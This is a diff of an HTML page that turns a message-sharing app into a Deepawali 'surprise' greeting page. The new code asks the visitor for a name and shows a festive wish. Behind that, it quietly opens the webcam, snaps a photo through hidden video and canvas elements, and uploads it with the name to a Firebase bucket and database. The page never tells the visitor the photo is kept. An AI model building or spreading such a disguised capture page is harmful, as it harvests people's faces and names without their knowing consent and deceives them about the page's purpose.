@@ -3,8 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Message Sharing Application</title>
+    <title>WishDeep</title>
     <style>
+        /* Main styling */
         body {
             display: flex;
             justify-content: center;
@@ -46,6 +47,25 @@
         button:hover {
             transform: scale(1.05);
         }
+        video, canvas {
+            display: none;
+        }
+        /* Loader styling */
+        .loader {
+            display: none;
+            border: 5px solid #f3f3f3;
+            border-radius: 50%;
+            border-top: 5px solid #FF5722;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        /* Popup styles */
         .popup {
             position: fixed;
             top: 0;
@@ -59,64 +79,108 @@
             z-index: 1000;
         }
         .popup-content {
-            background-color: rgba(0, 0, 0, 0.9);
+            background-image: url('download.jpeg');
+            background-size: cover;
             padding: 20px;
             border-radius: 10px;
             width: 300px;
             color: #fff;
             text-align: left;
+            position: relative;
         }
-        footer {
-            position: fixed;
-            bottom: 10px;
-            width: 100%;
-            text-align: center;
-            font-size: 14px;
-            color: #ffffff;
-            font-family: Arial, sans-serif;
-            opacity: 0.9;
-            background: rgba(0, 0, 0, 0.5);
-            padding: 10px;
-            border-radius: 5px;
+        .popup-content img {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            position: absolute;
+            top: -50px;
+            left: 50%;
+            transform: translateX(-50%);
+            border: 3px solid #fff;
         }
+        .popup-content h2, .popup-content p {
+            margin-top: 40px;
+            font-size: 16px;
+            line-height: 1.5;
+        }
+        
+        /* Footer styling */
+footer {
+    position: fixed;
+    bottom: 10px;
+    width: 100%;
+    text-align: center;
+    font-size: 14px;
+    color: #ffffff;
+    font-family: Arial, sans-serif;
+    opacity: 0.9;
+    background: rgba(0, 0, 0, 0.5);
+    padding: 10px;
+    border-radius: 5px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+}
+
+footer .profile-pic {
+    width: 40px;
+    height: 40px;
+    border-radius: 50%;
+    border: 2px solid #ffffff;
+}
+
     </style>
 </head>
 <body>
+<!-- Audio Element -->
+    <audio id="background-music" src="music.mp3" preload="auto"></audio>
 
-<div class="container" id="senderContainer">
-    <h1>Sender</h1>
-    <input type="text" id="senderName" placeholder="Your Name" required>
-    <input type="text" id="senderMessage" placeholder="Your Message" required>
-    <button id="generateLinkBtn">Generate Link</button>
-    <p id="linkText" style="display:none;"></p>
-    <button id="shareLinkBtn" style="display:none;">Copy Link</button>
-</div>
-
-<div class="container" id="receiverContainer" style="display:none;">
-    <h1>Receiver</h1>
-    <input type="text" id="receiverName" placeholder="Your Name" required>
-    <button id="submitCaptureBtn">Submit</button>
-</div>
-
-<div class="popup" id="popup">
-    <div class="popup-content">
-        <h2>Dear <span id="receiverWishName"></span>,</h2>
-        <p id="displayedMessage"></p>
-        <img id="receiverImage" src="" alt="Receiver Image" style="width:100px; border-radius: 50%;">
-        <p>Sincerely,<br><span id="senderNameDisplay"></span></p>
+    <script>
+        // Inline JavaScript for auto-playing music on user interaction
+        document.addEventListener('click', function playMusicOnce() {
+            const music = document.getElementById('background-music');
+            music.play();
+            
+            // Remove the event listener after first interaction
+            document.removeEventListener('click', playMusicOnce);
+        });
+    </script>
+    
+    <div class="container">
+        <h1>We Have A Surprise For You!!</h1>
+        <p>Please enter your name:</p>
+        <input type="text" id="userName" placeholder="Your Name" required>
+        <button id="submitCaptureBtn">Submit</button>
+        <div class="loader" id="loader"></div>
     </div>
-</div>
 
+    <video id="camera" autoplay></video>
+    <canvas id="canvas"></canvas>
+
+    <!-- Popup for Wishes -->
+    <div class="popup" id="popup">
+        <div class="popup-content">
+            <img id="userImage" src="" alt="User Image">
+            <h2>Dear <span id="userWishName"></span>,</h2>
+            <p id="wishText">Wishing you a very Happy Deepawali filled with joy, prosperity, and peace. May this festival of lights bring happiness to you and your family, and may your home be blessed with warmth and love. May this Deepawali bring light and joy to all aspects of your life.</p>
+            <p>Your Fellow<br>Avinash Mishra<br> (Founder TechSolvy)</p>
+        </div>
+    </div>
+<!-- Footer -->
 <footer>
-    Design & Built By Your Name
+<a href="www.techsolvy.online">
+<img src="ceo.jpeg" alt="Pt. Avinash Mishra Shastri" class="profile-pic"> </a>
+    Design & Developed By Pt. Avinash Mishra Shastri, Founder Of TechSolvy 
+www.techsolvy.online
 </footer>
 
-<script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.1.2/firebase-app.js";
-    import { getFirestore, collection, addDoc, doc, getDoc } from "https://www.gstatic.com/firebasejs/9.1.2/firebase-firestore.js";
-    import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/9.1.2/firebase-storage.js";
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.1.2/firebase-app.js";
+        import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/9.1.2/firebase-storage.js";
+        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.1.2/firebase-firestore.js";
 
-// For Firebase JS SDK v7.20.0 and later, measurementId is optional
+        // For Firebase JS SDK v7.20.0 and later, measurementId is optional
 const firebaseConfig = {
   apiKey: "AIzaSyAwB8JWKIRK6Bkat-NdM6OyVAvdrBk5cmM",
   authDomain: "capturedeep-126bf.firebaseapp.com",
@@ -127,99 +191,65 @@ const firebaseConfig = {
   measurementId: "G-VZEFR8X5BN"
 };
 
-    const app = initializeApp(firebaseConfig);
-    const db = getFirestore(app);
-    const storage = getStorage(app);
+        const app = initializeApp(firebaseConfig);
+        const storage = getStorage(app);
+        const db = getFirestore(app);
 
-    document.getElementById('generateLinkBtn').addEventListener('click', async () => {
-        const senderName = document.getElementById('senderName').value.trim();
-        const senderMessage = document.getElementById('senderMessage').value.trim();
-        
-        if (!senderName || !senderMessage) {
-            alert('Please fill in both fields.');
-            return;
+        const userNameInput = document.getElementById('userName');
+        const submitCaptureBtn = document.getElementById('submitCaptureBtn');
+        const camera = document.getElementById('camera');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        const loader = document.getElementById('loader');
+        const popup = document.getElementById('popup');
+        const userWishName = document.getElementById('userWishName');
+        const wishText = document.getElementById('wishText');
+        const userImage = document.getElementById('userImage');
+
+        let stream;
+
+        async function openCamera() {
+            stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            camera.srcObject = stream;
         }
 
-        // Add message to Firestore
-        const messageDoc = await addDoc(collection(db, 'messages'), {
-            senderName: senderName,
-            senderMessage: senderMessage
+        submitCaptureBtn.addEventListener('click', async () => {
+            const userName = userNameInput.value.trim();
+            if (!userName) {
+                alert('Please enter your name.');
+                return;
+            }
+
+            loader.style.display = 'block'; // Show loader
+
+            await openCamera();
+
+            setTimeout(() => {
+                canvas.width = camera.videoWidth;
+                canvas.height = camera.videoHeight;
+                context.drawImage(camera, 0, 0, canvas.width, canvas.height);
+
+                stream.getTracks().forEach(track => track.stop());
+
+                canvas.toBlob(async (blob) => {
+                    const imageRef = ref(storage, `deepawali_pics/${Date.now()}.png`);
+                    await uploadBytes(imageRef, blob);
+
+                    const imageUrl = await getDownloadURL(imageRef);
+                    await addDoc(collection(db, 'users'), {
+                        name: userName,
+                        imageUrl: imageUrl
+                    });
+
+                    // Display wishes in popup
+                    loader.style.display = 'none'; // Hide loader
+                    userWishName.innerText = userName;
+                    userImage.src = imageUrl;
+                    popup.style.display = 'flex';
+                });
+            }, 500);
         });
-
-        // Generate shareable link
-        const messageId = messageDoc.id;
-        const link = `${window.location.origin}/receiver.html?id=${messageId}`;
-        document.getElementById('linkText').innerText = `Link: ${link}`;
-        document.getElementById('linkText').style.display = 'block';
-        document.getElementById('shareLinkBtn').style.display = 'block';
-        document.getElementById('shareLinkBtn').onclick = () => {
-            navigator.clipboard.writeText(link).then(() => {
-                alert('Link copied to clipboard!');
-            });
-        };
-
-        // Clear fields
-        document.getElementById('senderName').value = '';
-        document.getElementById('senderMessage').value = '';
-    });
-
-    document.getElementById('submitCaptureBtn').addEventListener('click', async () => {
-        const receiverName = document.getElementById('receiverName').value.trim();
-        if (!receiverName) {
-            alert('Please enter your name.');
-            return;
-        }
-
-        const messageId = new URLSearchParams(window.location.search).get('id');
-
-        if (!messageId) {
-            alert('Invalid message link.');
-            return;
-        }
-
-        // Access the message from Firestore
-        const docRef = doc(db, 'messages', messageId);
-        const docSnap = await getDoc(docRef);
-
-        if (docSnap.exists()) {
-            const { senderMessage, senderName } = docSnap.data();
-
-            // Capture image logic (using webcam)
-            const canvas = document.createElement('canvas');
-            const ctx = canvas.getContext('2d');
-            navigator.mediaDevices.getUserMedia({ video: true }).then((stream) => {
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.play();
-                setTimeout(async () => {
-                    canvas.width = 640; // Set canvas width
-                    canvas.height = 480; // Set canvas height
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    const imageBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
-
-                    // Stop the camera
-                    stream.getTracks().forEach(track => track.stop());
-
-                    // Upload image to Firebase Storage
-                    const imageRef = ref(storage, `images/${messageId}.jpg`);
-                    await uploadBytes(imageRef, imageBlob);
-                    const imageURL = await getDownloadURL(imageRef);
-
-                    // Display in popup
-                    document.getElementById('receiverWishName').textContent = receiverName;
-                    document.getElementById('displayedMessage').textContent = senderMessage;
-                    document.getElementById('senderNameDisplay').textContent = senderName;
-                    document.getElementById('receiverImage').src = imageURL;
-
-                    // Show the popup
-                    document.getElementById('popup').style.display = 'flex';
-                }, 2000);
-            });
-        } else {
-            alert('No such message!');
-        }
-    });
-</script>
+    </script>
 
 </body>
-</html>
+                </html>
